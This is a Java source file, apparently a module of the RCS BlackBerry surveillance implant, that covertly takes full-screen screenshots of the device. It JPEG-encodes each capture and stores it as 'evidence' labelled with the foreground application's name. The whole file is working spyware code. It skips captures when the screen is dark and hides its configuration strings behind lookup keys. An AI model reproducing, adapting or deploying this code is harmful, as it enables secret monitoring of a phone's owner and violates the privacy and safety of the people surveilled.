//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : SnapShotAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.Display;
import net.rim.device.api.system.EncodedImage;
import net.rim.device.api.system.JPEGEncodedImage;
import net.rim.device.api.util.DataBuffer;
import blackberry.Messages;
import blackberry.Status;
import blackberry.config.ConfModule;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.utils.WChar;

/**
 * in holster.
 * 
 * @author user1
 */
public final class ModuleSnapshot extends BaseInstantModule {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION); //$NON-NLS-1$
    //#endif

    private static Bitmap bitmap;

    private static final int LOG_SNAPSHOT_VERSION = 2009031201;
    private static final int MIN_TIMER = 1 * 1000;
    private static final long SNAPSHOT_DELAY = 1000;

    /** The Constant CAPTURE_FULLSCREEN. */
    final private static int CAPTURE_FULLSCREEN = 0;

    /** The Constant CAPTURE_FOREGROUND. */
    final private static int CAPTURE_FOREGROUND = 1;

    /** The delay. */
    private int delay;

    /** The type. */
    private int type;
    private int quality;

    private int width;

    private int height;

    public static String getStaticType() {
        return Messages.getString("14.1"); //$NON-NLS-1$
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    public boolean parse(ConfModule conf) {
        try {
            String qualityParam = conf.getString(Messages.getString("14.2")); //$NON-NLS-1$
            if (Messages.getString("14.3").equals(qualityParam)) { //$NON-NLS-1$
                quality = 50;
            } else if (Messages.getString("14.4").equals(qualityParam)) { //$NON-NLS-1$
                quality = 70;
            } else if (Messages.getString("14.5").equals(qualityParam)) { //$NON-NLS-1$
                quality = 90;
            }
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

    // se e' in standby non prendi la snapshot
    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public synchronized void actualStart() {

        //#ifdef DEBUG
        debug.trace("snapshot"); //$NON-NLS-1$
        //#endif

        if (!Backlight.isEnabled()) {
            //#ifdef DEBUG
            debug.trace("No backlight, skipping snapshot"); //$NON-NLS-1$
            //#endif
            return;
        }
        
        if("net_rim_bb_alarm_app".equals(Status.getInstance().getCurrentForegroundAppMod())){
            //#ifdef DEBUG
            debug.trace("actualStart: clock, ignore");
            //#endif
            
            return;
        }

        EncodedImage encoded;

        if (bitmap == null) {
            width = Display.getWidth();
            height = Display.getHeight();
            bitmap = new Bitmap(width, height);
        }

        getScreenshot();

        //#ifdef DEBUG
        debug.info("Taking screenshot"); //$NON-NLS-1$
        //#endif

        encoded = JPEGEncodedImage.encode(bitmap, quality);

        byte[] plain = encoded.getData();
        encoded = null;

        Evidence evidence = new Evidence(EvidenceType.SNAPSHOT);
        evidence.atomicWriteOnce(getAdditionalData(), plain);

        //#ifdef DEBUG
        debug.trace("finished run"); //$NON-NLS-1$
        //#endif

    }

    /**
     * @return
     */
    public void getScreenshot() {

        //#ifdef DEBUG
        debug.trace("portrait: " + Display.getOrientation()); //$NON-NLS-1$
        debug.trace("w: " + width + " h:" + height); //$NON-NLS-1$ //$NON-NLS-2$
        debug.trace("horizontal res: " + Display.getHorizontalResolution()); //$NON-NLS-1$
        debug.trace("Rowwise: " + Display.isRowwise()); //$NON-NLS-1$
        //#endif

        Display.screenshot(bitmap, 0, 0, width, height);
    }

    private byte[] getAdditionalData() {
        final String window = Status.self().getCurrentForegroundAppName(); //$NON-NLS-1$
        final String program = Status.self().getCurrentForegroundAppMod(); //$NON-NLS-1$

        final int wlen = window.length() * 2;
        final int plen = program.length() * 2;
        final int tlen = wlen + plen + 24;
        final byte[] additionalData = new byte[tlen];

        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
                false);

        databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
        databuffer.writeInt(plen); // process name len
        databuffer.writeInt(wlen); // windows name len

        databuffer.write(WChar.getBytes(program));
        databuffer.write(WChar.getBytes(window));

        //#ifdef DBC
        Check.ensures(additionalData.length == tlen,
                "Wrong additional data name"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("Additional data len: " + additionalData.length); //$NON-NLS-1$

        //#endif

        return additionalData;
    }

}
